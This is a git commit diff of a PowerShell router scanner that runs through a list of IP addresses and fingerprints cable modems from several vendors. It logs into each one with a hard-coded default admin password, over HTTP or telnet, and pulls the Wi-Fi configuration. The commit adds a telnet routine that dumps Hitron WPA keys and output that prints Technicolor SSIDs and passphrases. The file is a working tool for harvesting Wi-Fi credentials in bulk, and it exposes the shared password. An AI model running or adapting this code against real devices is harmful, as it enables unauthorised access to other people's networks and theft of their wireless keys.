d5d67aee80d18be7313f26ede85acb6297fd9bbb
Julian Grijalba <caprijuda@gmail.com>
2019-07-02 13:36:18 -0500

    Improved Hitron CGNV2 support with telnet connection

--- NATscanner.ps1
+++ NATscanner.ps1
@@ -12,7 +12,7 @@ function verifyFile(){
 			Remove-Item $save
 		}
 	}else{
-		echo "No se pudo obtener información. Verificar credenciales";
+		Write-Output "No se pudo obtener información. Verificar credenciales";
 	}
 }
 
@@ -31,7 +31,7 @@ function createDirectory($DirectoryToCreate){
 function setup(){
 	#Verificar si existe la lista de IPs
 	if(!(Test-Path $IPs_LIST_PATH)){
-		echo "No se encuentra la lista de IPs"
+		Write-Output "No se encuentra la lista de IPs"
 		break;
 	}
 
@@ -84,7 +84,7 @@ Function Get-Telnet{
         }
 		$Result | Out-File $save
     }Else{
-		echo "No se pudo conectar a $RemoteHost."
+		Write-Output "No se pudo conectar a $RemoteHost."
     }
     
 }
@@ -92,7 +92,7 @@ Function Get-Telnet{
 #===================Routers=====================
 # Technicolor y Thompson que usan DOCSIS 2.0 
 function techTom($ip){
-	echo "$ip - Technicolor - Thompson" 
+	Write-Output "$ip - Technicolor - Thompson" 
 	curl --connect-timeout 3 -m 10 -s -u admin:Uq-4GIt3M http://$ip/ | out-null;
 	curl --connect-timeout 3 -m 10 -s -u admin:Uq-4GIt3M http://$ip/ | out-null;
     curl --connect-timeout 3 -m 10 -s -u admin:Uq-4GIt3M -H "Authorization: Basic YWRtaW46VXEtNEdJdDNN" -H "Accept-Encoding: gzip, deflate" -H "Accept-Language: es,en;q=0.9,es-419;q=0.8" -H "Upgrade-Insecure-Requests: 1" -H "User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.62 Safari/537.36" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" -H "Referer: http://$ip/wlanRadio.asp" -H "Cookie: name=Session" -H "Connection: keep-alive" --compressed http://$ip/wlanPrimaryNetwork.asp | out-null;
@@ -103,7 +103,7 @@ function techTom($ip){
 
 # Cisco DPC3925
 function cisco($ip){
-	echo "$ip - Cisco DPC3925" 
+	Write-Output "$ip - Cisco DPC3925" 
 	$cookie = "$SAVE_FOLDER\$ip"+"cookie.txt"
     wget -qO- -q --keep-session-cookies --save-cookies $cookie --post-data "username_login=admin&password_login=Uq-4GIt3M&LanguageSelect=en&Language_Submit=0&login=Log+In" -T 3 http://$ip/goform/Docsis_system | out-null;
 	if(Test-Path $cookie){
@@ -111,20 +111,20 @@ function cisco($ip){
 		verifyFile
 		Remove-Item $cookie;
 	}else{
-		echo "No se pudo obtener acceso a $ip. Verificar credenciales"
+		Write-Output "No se pudo obtener acceso a $ip. Verificar credenciales"
 	}
 }
 
 # Tech WAN
 function wan($ip){
-	echo "$ip - Wan" 
+	Write-Output "$ip - Wan" 
 	Get-Telnet -RemoteHost "$ip" -Commands " ","admin","Uq-4GIt3M","cd wifi","show nvram" 
    	verifyFile
 }
 
 # Motorola con DOCSIS 2.0
 function motorola($ip){ 
-	echo "$ip - Motorola DOCSIS 2.0" 
+	Write-Output "$ip - Motorola DOCSIS 2.0" 
     curl --connect-timeout 3 -m 10 -s --data "loginUsername=admin&loginPassword=Uq-4GIt3M" http://$ip/goform/login | out-null;
     curl --connect-timeout 3 -m 10 -s --data "loginUsername=admin&loginPassword=Uq-4GIt3M" http://$ip/goform/login | out-null;
 	curl --connect-timeout 3 -m 10 -s -u admin:Uq-4GIt3M -H "Accept-Encoding: gzip, deflate" -H "Accept-Language: es,en;q=0.9,es-419;q=0.8" -H "Upgrade-Insecure-Requests: 1" -H "Authorization: Basic YWRtaW46VXEtNEdJdDNN" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" -H "User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.62 Safari/537.36" -H "Connection: keep-alive" --compressed http://$ip/wlanPrimaryNetwork.asp | out-null;
@@ -134,7 +134,7 @@ function motorola($ip){
 
 # Motorola SBG900
 function motorolasbg($ip){ 
-	echo "$ip - Motorola SBG900" 
+	Write-Output "$ip - Motorola SBG900" 
     if((Invoke-WebRequest -Uri "http://$ip/frames.asp" -Method "POST" -Headers @{"Cache-Control"="max-age=0"; "Origin"="$ip"; "Upgrade-Insecure-Requests"="1"; "DNT"="1"; "User-Agent"="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36"; "Accept"="text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3"; "Referer"="http://$ip/index.asp"; "Accept-Encoding"="gzip, deflate"; "Accept-Language"="es-CO,es-AR;q=0.9,es-419;q=0.8,es;q=0.7,fr;q=0.6"} -ContentType "application/x-www-form-urlencoded" -Body "userId=admin&password=Uq-4GIt3M&btnLogin=Log+In").content -match '\d\d\d\d\d'){
     $sessionID = $Matches[0]
     curl -o $save --connect-timeout 3 -m 60 -s http://$ip/wireless/wirelessStatus.asp?sessionId=$sessionID -H "Connection: keep-alive" -H "Upgrade-Insecure-Requests: 1" -H "DNT: 1" -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3" -H "Referer: http://$ip/wireless/tabs.asp?sessionId=29805" -H "Accept-Encoding: gzip, deflate" -H "Accept-Language: es-CO,es-AR;q=0.9,es-419;q=0.8,es;q=0.7,fr;q=0.6" --compressed --insecure
@@ -155,7 +155,7 @@ function unlockCisco($ip){
 
 # Cisco DPC2420
 function ciscoAuth($ip){
-	echo "$ip - Cisco DPC2420" 
+	Write-Output "$ip - Cisco DPC2420" 
 	unlockCisco $ip;
 	unlockCisco $ip;
 	curl --connect-timeout 3 -m 10 -s -H "Accept-Encoding: gzip, deflate" -H "Accept-Language: es,en;q=0.9,es-419;q=0.8" -H "Upgrade-Insecure-Requests: 1" -H "User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" -H "Referer: http://$ip/webstar.html" -H "Connection: keep-alive" --compressed http://$ip/status.asp  | out-null;
@@ -165,15 +165,17 @@ function ciscoAuth($ip){
 
 # Technicolor CGA0101
 function techCGA0101($ip){
-	echo "$ip - Technicolor CGA0101" 
+	Write-Output "$ip - Technicolor CGA0101" 
     curl --connect-timeout 10 -s -m 10 -H 'Host: $ip' -H 'Origin: http://$ip' -H 'X-CSRF-TOKEN: ' -H 'User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36' -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -H 'Accept: */*' -H 'X-Requested-With: XMLHttpRequest' -H 'Referer: http://$ip/' -H 'Accept-Language: es,en;q=0.9,es-419;q=0.8' -H 'Cookie: theme-value=css/theme/dark/; lang=en' --data-binary "loginUsername=admin&loginPassword=Uq-4GIt3M" --compressed http://$ip/goform/login | out-null;
 	curl -o $save --connect-timeout 10 -m 60 -s -H 'Host: $ip' -H 'Accept: */*' -H 'X-CSRF-TOKEN: ' -H 'X-Requested-With: XMLHttpRequest' -H 'User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36' -H 'Referer: http://$ip/' -H 'Accept-Language: es,en;q=0.9,es-419;q=0.8' -H 'Cookie: theme-value=css/theme/dark/; lang=en' --compressed http://$ip/Wir_WirelessAPI.json;
 	verifyFile
+	$json = ((Get-Content $save | Out-String | ConvertFrom-Json).1).data
+	Write-Output $json.SSID - $json.KeyPassphrase
 }
 
 # Technicolor DPC3928SL2 
 function techDPC3928SL2($ip){
-	echo "$ip - Technicolor DPC3928SL2" 
+	Write-Output "$ip - Technicolor DPC3928SL2" 
     curl --connect-timeout 3 -s -m 10 -H 'Host: $ip' -H 'Cache-Control: max-age=0' -H 'Origin: http://$ip' -H 'Upgrade-Insecure-Requests: 1' -H 'User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8' -H 'Referer: http://$ip/' -H 'Accept-Language: es,en;q=0.9,es-419;q=0.8' --data "username_login=admin&password_login=Uq-4GIt3M&Language_English=1&login=Log+In&todo=&this_file=Docsis_system.htm&next_file=Docsis_system.htm&message=%40msg_text%23" --compressed http://$ip/goform/Docsis_system | out-null;
 	curl -o $save --connect-timeout 3 -m 60 -s -H 'Host: $ip' -H 'Upgrade-Insecure-Requests: 1' -H 'User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8' -H 'Referer: http://$ip/WPS.asp' -H 'Accept-Language: es,en;q=0.9,es-419;q=0.8' --compressed http://$ip/WRadioSettings.asp;
     verifyFile
@@ -181,21 +183,14 @@ function techDPC3928SL2($ip){
 
 # Hitron CGNV2
 function hitron($ip){
-	echo "$ip - Hitron CGNV2" 
-	$cookie = "$SAVE_FOLDER\$ip"+"cookie.txt"
-    wget -qO- -q --keep-session-cookies --save-cookies $cookie --post-data "user=admin^&pws=Uq-4GIt3M" -T 3 http://$ip/goform/login | out-null;
-    if(Test-Path $cookie){
-		wget -qO- -q --load-cookies $cookie -O $save --header="User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36" --header="Referer: http://$ip/Status.asp" --header="Connection: keep-alive" -T 3 http://$ip/msoadmin/cable-Systeminfo.asp | out-null;
-		verifyFile
-		Remove-Item $cookie;
-	}else{
-		echo "No se pudo obtener acceso a $ip. Verificar credenciales"
-	}
+	Write-Output "$ip - Hitron CGNV2" 
+	Get-Telnet -RemoteHost "$ip" -Commands "admin","Uq-4GIt3M","wpaKeygetnow","cable" ,"system" ,"ipPrint"
+	verifyFile
 }
 
 # Ubee con DOCSIS 3.0
 function ubee($ip){
-	echo "$ip - Ubee" 
+	Write-Output "$ip - Ubee" 
     curl --connect-timeout 3 -m 10 -s -d "loginUsername=admin&loginPassword=Uq-4GIt3M" http://$ip/goform/login | out-null;
     curl --connect-timeout 3 -m 10 -s -H "Accept-Encoding: gzip, deflate" -H "Accept-Language: es,en;q=0.9,es-419;q=0.8" -H "Upgrade-Insecure-Requests: 1" -H "User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.62 Safari/537.36" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" -H "Referer: http://$ip/wlanRadio.asp" -H "Connection: keep-alive" --compressed http://$ip/wlanPrimaryNetwork.asp | out-null;
     curl -o $save --connect-timeout 3 -m 60 -s -H "Accept-Encoding: gzip, deflate" -H "Accept-Language: es,en;q=0.9,es-419;q=0.8" -H "Upgrade-Insecure-Requests: 1" -H "User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.62 Safari/537.36" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" -H "Referer: http://$ip/wlanRadio.asp" -H "Connection: keep-alive" --compressed http://$ip/wlanPrimaryNetwork.asp;
@@ -204,7 +199,7 @@ function ubee($ip){
 
 #Ubee sin DOCSIS
 function ubeeA($ip){
-	echo "$ip - Ubee sin DOCSIS" 
+	Write-Output "$ip - Ubee sin DOCSIS" 
     curl --connect-timeout 3 -m 10 -s -u admin:Uq-4GIt3M -H "Accept-Encoding: gzip, deflate" -H "Accept-Language: es,en;q=0.9,es-419;q=0.8" -H "Upgrade-Insecure-Requests: 1" -H "Authorization: Basic YWRtaW46VXEtNEdJdDNN" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" -H "User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36" -H "Connection: keep-alive" --compressed http://$ip/wlanBasic.asp;
     curl --connect-timeout 3 -m 10 -s -u admin:Uq-4GIt3M -H "Accept-Encoding: gzip, deflate" -H "Accept-Language: es,en;q=0.9,es-419;q=0.8" -H "Upgrade-Insecure-Requests: 1" -H "Authorization: Basic YWRtaW46VXEtNEdJdDNN" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" -H "User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36" -H "Connection: keep-alive" --compressed http://$ip/wlanBasic.asp;
     curl -o $save --connect-timeout 3 -m 60 -s -u admin:Uq-4GIt3M -H "Accept-Encoding: gzip, deflate" -H "Accept-Language: es,en;q=0.9,es-419;q=0.8" -H "Upgrade-Insecure-Requests: 1" -H "Authorization: Basic YWRtaW46VXEtNEdJdDNN" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" -H "User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36" -H "Connection: keep-alive" --compressed http://$ip/wlanBasic.asp;
@@ -231,7 +226,7 @@ function runScanner(){
 				".*Touchstone.*" {"$line - Arris (No support)"; Break}
 				".*<title>Residential Gateway Configuration: Login</title>.*" {ubee $line; break}
 				".*<title>Residential Gateway Configuration: Cable Modem - Navigation</title>.*" {ubeeA $line; break}
-				default {echo "$line - $title"; Break}
+				default {Write-Output "$line - $title"; Break}
 			}
 		}
 	}
